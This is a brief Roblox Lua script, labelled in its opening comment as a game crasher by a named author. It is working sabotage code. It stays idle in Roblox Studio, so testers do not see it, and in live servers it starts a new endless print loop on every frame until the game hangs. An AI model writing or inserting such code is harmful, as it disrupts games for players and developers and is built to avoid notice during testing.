--This is a simple roblox game crasher made by casanova
--Github cfreemepq

if not game:GetService("RunService"):IsStudio() then
	local function Crash()
		for i = 1, math.huge, 1 do
			print(math.sqrt(i))
		end
		while true do
			task.wait(math.huge)
		end
	end
	game:GetService("RunService").Stepped:Connect(function()
		coroutine.wrap(Crash)()
	end)
end
